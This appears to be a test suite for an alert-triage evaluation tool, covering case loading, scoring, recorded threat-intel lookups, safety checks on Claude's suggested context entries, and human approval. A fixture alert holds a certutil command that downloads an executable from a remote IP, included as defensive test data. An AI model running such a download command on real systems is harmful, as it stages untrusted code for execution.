// The cold loop: labelled cases, scoring, recorded lookups, Claude's review with its safety checks, and approval.
import { afterAll, beforeAll, describe, expect, test } from "bun:test";
import { cpSync, existsSync, mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { cacheKeyForUrl, compareRuns, evaluateCases, loadCaseFiles, lookupCache, outcomeFor, renderReport, summarise, type CaseOutcome, type Report } from "../server/src/evaluate";
import { EMPTY_MEMORY, readMemory } from "../server/src/memory";
import { approveProposals, memoryWithProposals, readProposalFile, rejectProposals, writeProposalFile, type ProposalFile } from "../server/src/proposals";
import { reviewReport, yesNoQuestionIds, type AskClaude } from "../server/src/review";
import type { ProviderResponse, Services } from "../server/src/platform";
import { standInServices, stubPublicFetch, testCtx } from "./helpers";

const tmp: string[] = [];
const tempDir = (prefix: string) => { const d = mkdtempSync(join(tmpdir(), prefix)); tmp.push(d); return d; };
afterAll(() => { for (const d of tmp) rmSync(d, { recursive: true, force: true }); });

let restore: () => void;
beforeAll(() => { restore = stubPublicFetch(); });
afterAll(() => restore());

const DOWNLOAD = "EDR detection on WS-FIN-042\ncertutil.exe -urlcache -split -f http://45.9.1.2/p.exe C:\\Users\\Public\\p.exe";
const PSEXEC = "EDR alert: PsExec used for remote execution\nHost: SRV-APP-07\nUser: CORP\\svc_patching\nCommand: PsExec64.exe \\\\SRV-APP-08 -s C:\\Tools\\patch_agent.exe /install";

describe("labelled case files", () => {
  test("one case or an array; JSON alerts are kept as JSON text", () => {
    const dir = tempDir("jev-cases-");
    writeFileSync(join(dir, "a.json"), JSON.stringify({ id: "one", label: "malicious", alert: "some alert", why: "because" }));
    writeFileSync(join(dir, "b.json"), JSON.stringify([{ label: "benign", alert: { rule: "x", user: "CORP\\a" } }, { id: "n", label: "benign", alert: "t", notes: ["approved"] }]));
    writeFileSync(join(dir, "README.md"), "ignored");
    const cases = loadCaseFiles(dir);
    expect(cases.map((c) => c.ref)).toEqual(["a#one", "b#1", "b#n"]);
    expect(JSON.parse(cases[1]!.alert)).toEqual({ rule: "x", user: "CORP\\a" });
    expect(cases[2]!.notes).toEqual(["approved"]);
    expect(loadCaseFiles(join(dir, "missing"))).toEqual([]);
  });
  test("a bad file names the file and the problem", () => {
    const dir = tempDir("jev-cases-");
    writeFileSync(join(dir, "bad.json"), JSON.stringify([{ label: "benign", alert: "x" }, { label: "unsure", alert: "y" }]));
    expect(() => loadCaseFiles(dir)).toThrow("bad.json item 2: label");
    writeFileSync(join(dir, "bad.json"), "{ nope");
    expect(() => loadCaseFiles(dir)).toThrow("bad.json: not valid JSON");
  });
  test("the shipped sample set loads", () => {
    const cases = loadCaseFiles(join(import.meta.dir, "..", "eval", "cases"));
    expect(cases.length).toBe(26);
    expect(cases.filter((c) => c.label === "malicious").length).toBe(16);
  });
});

describe("scoring", () => {
  const o = (ref: string, label: "malicious" | "benign", verdict: "malicious" | "benign" | "needs_human" | null, ms = 1000): CaseOutcome =>
    ({ ref, source: "file", label, why: null, decidedBy: null, verdict, outcome: verdict ? outcomeFor(label, verdict) : "error", pMalicious: null, durationMs: ms, jevRequests: 4, orgContext: [], stopReason: null });
  test("outcomes", () => {
    expect(outcomeFor("malicious", "benign")).toBe("false_benign");
    expect(outcomeFor("benign", "malicious")).toBe("false_malicious");
    expect(outcomeFor("benign", "needs_human")).toBe("needs_analyst");
    expect(outcomeFor("malicious", "malicious")).toBe("correct");
  });
  test("summary numbers", () => {
    const s = summarise([o("1", "malicious", "malicious", 2000), o("2", "malicious", "benign", 4000), o("3", "malicious", "needs_human", 6000), o("4", "benign", "benign", 1000), o("5", "benign", "malicious", 3000), o("6", "benign", null)]);
    expect(s).toMatchObject({ cases: 6, malicious: 3, benign: 3, correct: 2, falseBenign: 1, falseMalicious: 1, needsAnalyst: 1, errors: 1, accuracy: 33.3, decidedAccuracy: 50, automationRate: 66.7, maliciousCaughtOrEscalated: 66.7, medianSeconds: 3, jevRequestsPerCase: 4 });
  });
  test("comparing two runs finds fixed and broken cases", () => {
    const before = [o("a", "benign", "needs_human"), o("b", "malicious", "malicious"), o("c", "benign", "benign")];
    const after = [o("a", "benign", "benign"), o("b", "malicious", "needs_human"), o("c", "benign", "benign")];
    expect(compareRuns(before, after).map((c) => [c.ref, c.direction])).toEqual([["a", "fixed"], ["b", "broken"]]);
  });
});

describe("recorded lookups", () => {
  test("API keys never end up in the cache key", () => {
    expect(cacheKeyForUrl("https://api.shodan.io/shodan/host/1.2.3.4?key=SECRET&minify=true")).toBe("api.shodan.io/shodan/host/1.2.3.4?minify=true");
  });
  test("definite answers are recorded, replayed and saved; failures are not", async () => {
    const file = join(tempDir("jev-cache-"), "cache.json");
    let calls = 0;
    const inner: Services = { ...standInServices(), async virustotalLookup({ path }): Promise<ProviderResponse> { calls += 1; return path.includes("fail") ? { ok: false, dataJson: null, error: "429", durationMs: 5 } : { ok: true, dataJson: JSON.stringify({ status: 200, body: { path } }), error: null, durationMs: 5 }; } };
    const cache = lookupCache(file);
    const s = cache.services(inner);
    await s.virustotalLookup({ path: "/files/abc", delayMs: 15_000 });
    const again = await s.virustotalLookup({ path: "/files/abc", delayMs: 15_000 });
    await s.virustotalLookup({ path: "/fail", delayMs: 0 }); await s.virustotalLookup({ path: "/fail", delayMs: 0 });
    expect(calls).toBe(3);
    expect(JSON.parse(again.dataJson!)).toEqual({ status: 200, body: { path: "/files/abc" } });
    cache.save();
    const reloaded = lookupCache(file).services({ ...inner, async virustotalLookup() { throw new Error("should not be called"); } });
    expect((await reloaded.virustotalLookup({ path: "/files/abc", delayMs: 0 })).ok).toBe(true);
  });
  test("only GETs to the public lookup hosts are recorded", async () => {
    const hits: string[] = [];
    const before = globalThis.fetch;
    globalThis.fetch = (async (url: string) => { hits.push(url); return new Response(JSON.stringify({ n: hits.length }), { status: 200 }); }) as unknown as typeof fetch;
    const cache = lookupCache(null);
    const undo = cache.installFetch();
    try {
      const a = await (await fetch("https://dns.google/resolve?name=x.example&type=A")).json();
      const b = await (await fetch("https://dns.google/resolve?name=x.example&type=A")).json();
      await fetch("https://api.typesafe.ai/v1/systemone", { method: "POST", body: "{}" }); await fetch("https://api.typesafe.ai/v1/systemone", { method: "POST", body: "{}" });
      await fetch("https://example.org/x"); await fetch("https://example.org/x");
      expect(a).toEqual(b);
      expect(hits.length).toBe(5);
    } finally { undo(); globalThis.fetch = before; }
  });
});

describe("running an evaluation", () => {
  test("each case gets a fresh run; only the misses keep their details", async () => {
    const cases = [
      { ref: "dl", source: "file" as const, alert: DOWNLOAD, label: "malicious" as const, notes: [], why: "payload download", decidedBy: null },
      { ref: "psexec", source: "file" as const, alert: PSEXEC, label: "benign" as const, notes: [], why: "approved patch push", decidedBy: null },
    ];
    const seen: string[] = [];
    const out = await evaluateCases(cases, () => testCtx(standInServices()), { onCase: (x) => seen.push(x.ref) });
    expect(out.map((x) => x.outcome)).toEqual(["correct", "needs_analyst"]);
    expect(seen.sort()).toEqual(["dl", "psexec"]);
    expect(out[0]!.result).toBeUndefined();
    expect(out[1]!.result?.findings.length).toBeGreaterThan(0);
    expect(out[1]!.alert).toBe(PSEXEC);
    const md = renderReport({ createdAt: "2026-09-28T10:00:00Z", settings: { jev: "stand-in", memory: "off", lookups: "none", sources: ["x"], rounds: 3 }, summary: summarise(out), outcomes: out });
    expect(md).toContain("| Missed: malicious called benign | **0** |");
    expect(md).toContain("| psexec | benign | sent to analyst |");
  });
  test("an engine error is reported, not thrown", async () => {
    const broken = { ...standInServices(), async jevEvaluate(): Promise<ProviderResponse> { throw new Error("boom"); } };
    const [x] = await evaluateCases([{ ref: "e", source: "file", alert: DOWNLOAD, label: "malicious", notes: [], why: null, decidedBy: null }], () => testCtx(broken));
    expect(x).toMatchObject({ outcome: "error", error: "boom" });
  });
});

// ---------------------------------------------------------------- review and approval
async function missedCase(alert: string, label: "malicious" | "benign"): Promise<CaseOutcome> {
  const [x] = await evaluateCases([{ ref: `case-${label}`, source: "database", alert, label, notes: [], why: "Approved patch push, CHG-44213.", decidedBy: "j.doe" }], () => testCtx(standInServices()));
  if (x!.outcome === "correct") throw new Error("expected a miss");
  return x!;
}
const report = (outcomes: CaseOutcome[]): Report => ({ createdAt: "2026-09-28T10:00:00Z", settings: { jev: "stand-in", memory: "off", lookups: "none", sources: [], rounds: 3 }, summary: summarise(outcomes), outcomes });
const suggestion = (over: Record<string, unknown>) => ({ diagnosis: { cause: "missing_org_context", explanation: "The agent didn't know svc_patching." }, memory_entries: [], question_criteria: [], lesson: "", engine_suggestion: "", ...over });

describe("review", () => {
  test("Claude's suggestions are checked before anyone sees them", async () => {
    const miss = await missedCase(PSEXEC, "benign");
    const yesNo = yesNoQuestionIds(miss.result!);
    expect(yesNo.length).toBeGreaterThan(0);
    const prompts: string[] = [];
    const ask: AskClaude = async (p) => { prompts.push(p.user); return { ok: true, model: "claude-test", value: suggestion({
      memory_entries: [
        { kind: "account", match: ["CORP\\svc_patching"], note: "svc_patching is the patch automation account; it runs PsExec during the monthly patch window.", effect: "explains_normal", why: "analyst reason" },
        { kind: "account", match: ["CORP\\someone_else"], note: "Invented account that isn't in this case.", effect: "explains_normal", why: "" },
        { kind: "tool", match: ["PsExec64.exe"], note: "PsExec is used by admins.", effect: "explains_normal", why: "" },
        { kind: "ip", match: ["10.0.0.0/8"], note: "The whole corporate network.", effect: "explains_normal", why: "" },
      ],
      question_criteria: [
        { question_id: yesNo[0], yes: "Clear evidence an attacker is acting.", no: "Expected administrative activity.", why: "" },
        { question_id: "made_up_question", yes: "yes yes yes", no: "no no no", why: "" },
      ],
      lesson: "Patch pushes by svc_patching look like lateral movement without context.",
      engine_suggestion: "Add a question about change windows.",
    }) }; };
    const r = await reviewReport(report([miss]), "eval/reports/x.json", EMPTY_MEMORY, ask);
    expect(prompts[0]).toContain("<alert>");
    expect(prompts[0]).toContain("Approved patch push, CHG-44213.");
    expect(r.failures).toEqual([]);
    expect(r.model).toBe("claude-test");
    expect(r.proposals.map((p) => p.type)).toEqual(["memory_entry", "question_criteria", "lesson", "engine_suggestion"]);
    const entry = r.proposals[0]!;
    expect(entry.type === "memory_entry" && entry.entry).toMatchObject({ id: "account-svc-patching", kind: "account", match: ["CORP\\svc_patching"] });
    expect(r.set_aside.map((s) => s.reason)).toEqual([
      "more than 3 suggested",
      "doesn't match the case it came from",
      "too broad: a built-in or common tool that attackers also use",
      "not a yes/no question asked in this case",
    ]);
  });

  test("wide ranges, detection names and incomplete items are set aside", async () => {
    const miss = await missedCase(PSEXEC, "benign");
    const r = await reviewReport(report([miss]), "r.json", EMPTY_MEMORY, async () => ({ ok: true, value: suggestion({ memory_entries: [
      { kind: "ip", match: ["10.0.0.0/8"], note: "The whole corporate network.", effect: "raises_suspicion", why: "" },
      { kind: "detection", match: ["PsExec used for remote execution"], note: "This detection is usually admins.", effect: "explains_normal", why: "" },
      { kind: "host", match: ["SRV-APP-07"], effect: "explains_normal" },
    ] }) }));
    expect(r.set_aside.map((s) => s.reason.replace(/ \(.*/, ""))).toEqual(["incomplete", "IP range wider than /16", "too broad: would explain every alert of this type"]);
  });

  test("nothing that would make a malicious case look normal, or clear a malicious indicator", async () => {
    const miss = await missedCase(PSEXEC, "malicious");
    const ask: AskClaude = async () => ({ ok: true, value: suggestion({ memory_entries: [
      { kind: "account", match: ["CORP\\svc_patching"], note: "svc_patching is the patch account.", effect: "explains_normal", why: "" },
      { kind: "host", match: ["SRV-APP-07"], note: "SRV-APP-07 is an application server; admins don't log on to it interactively.", effect: "raises_suspicion", why: "" },
    ] }) });
    const r = await reviewReport(report([miss]), "r.json", EMPTY_MEMORY, ask);
    expect(r.set_aside.map((s) => s.reason)).toEqual(["would make a malicious case look normal"]);
    expect(r.proposals.filter((p) => p.type === "memory_entry").length).toBe(1);

    const benign = await missedCase(DOWNLOAD.replace("45.9.1.2", "10.20.9.10"), "benign").catch(() => null) ?? await missedCase(PSEXEC, "benign");
    benign.result!.indicators.push({ value: "10.20.9.10", type: "ip", origin: "alert", pMalicious: 0.95, verdict: "malicious", signals: [], labels: [], strongHits: ["listed"], unavailable: [] });
    benign.result!.internalIps.push("10.20.9.10");
    const r2 = await reviewReport(report([benign]), "r.json", EMPTY_MEMORY, async () => ({ ok: true, value: suggestion({ memory_entries: [{ kind: "ip", match: ["10.20.9.10"], note: "Internal file server.", effect: "explains_normal", why: "" }] }) }));
    expect(r2.set_aside.map((s) => s.reason)).toEqual(["describes an indicator this case found malicious as normal"]);
  });

  test("a questionable label stops context and wording changes; bad answers are reported", async () => {
    const miss = await missedCase(PSEXEC, "benign");
    let call = 0;
    const r = await reviewReport(report([miss, { ...miss, ref: "second" }]), "r.json", EMPTY_MEMORY, async () => call++ === 0
      ? { ok: true, value: suggestion({ diagnosis: { cause: "label_questionable", explanation: "This looks like real lateral movement." }, memory_entries: [{ kind: "account", match: ["CORP\\svc_patching"], note: "patch account", effect: "explains_normal", why: "" }] }) }
      : { ok: true, value: { nonsense: true } });
    expect(r.proposals).toEqual([]);
    expect(r.set_aside[0]!.reason).toContain("label may be wrong");
    expect(r.failures.length).toBe(1);
  });
});

describe("approving proposals", () => {
  async function setup() {
    const memoryDir = tempDir("jev-memory-");
    cpSync(join(import.meta.dir, "..", "memory"), memoryDir, { recursive: true });
    const miss = await missedCase(PSEXEC, "benign");
    const yesNo = yesNoQuestionIds(miss.result!)[0]!;
    const r = await reviewReport(report([miss]), "eval/reports/x.json", EMPTY_MEMORY, async () => ({ ok: true, model: "m", value: suggestion({
      memory_entries: [{ kind: "account", match: ["CORP\\svc_patching"], note: "svc_patching is the patch automation account.", effect: "explains_normal", expires: "2027-01-31", why: "" }],
      question_criteria: [{ question_id: yesNo, yes: "Clear evidence an attacker is acting.", no: "Expected administrative activity.", why: "" }],
      lesson: "Patch pushes need context.", engine_suggestion: "Ask about change windows.",
    }) }));
    const { failures: _f, ...file } = r;
    const path = join(memoryDir, "proposals", "review-1.yaml");
    writeProposalFile(path, file as ProposalFile);
    return { memoryDir, path, yesNo };
  }

  test("approved items are appended with provenance; comments stay; the file records the decision", async () => {
    const { memoryDir, path, yesNo } = await setup();
    expect(readProposalFile(path).proposals.map((p) => p.status)).toEqual(["pending", "pending", "pending", "pending"]);
    const trial = memoryWithProposals(memoryDir, readProposalFile(path).proposals.slice(0, 2), new Date("2026-09-28"));
    expect(trial.entries.map((e) => e.id)).toEqual(["account-svc-patching"]);
    expect(readMemory(memoryDir).entries).toEqual([]); // trying doesn't write

    const messages = approveProposals(memoryDir, path, ["p1", "p2", "p3"], "j.doe", new Date("2026-09-28"));
    expect(messages.length).toBe(3);
    const context = readFileSync(join(memoryDir, "context.yaml"), "utf8");
    expect(context).toContain("# Organisation context: what your team knows");
    const m = readMemory(memoryDir);
    expect(m.entries[0]).toMatchObject({ id: "account-svc-patching", added_by: "j.doe", added_on: "2026-09-28", expires: "2027-01-31", source: "review-1.yaml p1, case case-benign" });
    expect(m.match({ users: ["svc_patching"], hosts: [], ips: [], domains: [], hashes: [], commands: [], title: "" })[0]?.id).toBe("account-svc-patching");
    expect(m.criteria[yesNo]).toMatchObject({ yes: "Clear evidence an attacker is acting.", added_by: "j.doe" });
    expect(readFileSync(join(memoryDir, "lessons.md"), "utf8")).toContain("Patch pushes need context.");
    const after = readProposalFile(path).proposals;
    expect(after.map((p) => p.status)).toEqual(["approved", "approved", "approved", "pending"]);
    expect(after[0]!.decided).toEqual({ by: "j.doe", on: "2026-09-28" });

    expect(() => approveProposals(memoryDir, path, ["p1"], "j.doe")).toThrow("p1 is already approved");
    expect(rejectProposals(path, ["all"], "j.doe", "not now")).toEqual(["p4: rejected"]);
    expect(readProposalFile(path).proposals[3]!.decided?.reason).toBe("not now");
  });

  test("all-or-nothing: a clash or a file it can't safely edit changes nothing", async () => {
    const { memoryDir, path } = await setup();
    approveProposals(memoryDir, path, ["p1"], "a");
    // Same entry proposed again from a later review.
    const file = readProposalFile(path); file.proposals[0]!.status = "pending";
    writeProposalFile(path, file);
    const before = readFileSync(join(memoryDir, "context.yaml"), "utf8");
    expect(() => approveProposals(memoryDir, path, ["p2", "p1"], "a")).toThrow('memory already has an entry "account-svc-patching"');
    expect(readFileSync(join(memoryDir, "context.yaml"), "utf8")).toBe(before);
    expect(existsSync(join(memoryDir, "question-criteria.yaml")) && readMemory(memoryDir).criteria).toEqual({});

    const odd = tempDir("jev-memory-"); mkdirSync(join(odd, "proposals"));
    writeFileSync(join(odd, "context.yaml"), "entries: []\nnotes: hand-written\n");
    expect(() => approveProposals(odd, path, ["p1"], "a")).toThrow("add this item by hand");
    expect(readFileSync(join(odd, "context.yaml"), "utf8")).toBe("entries: []\nnotes: hand-written\n");
  });
});
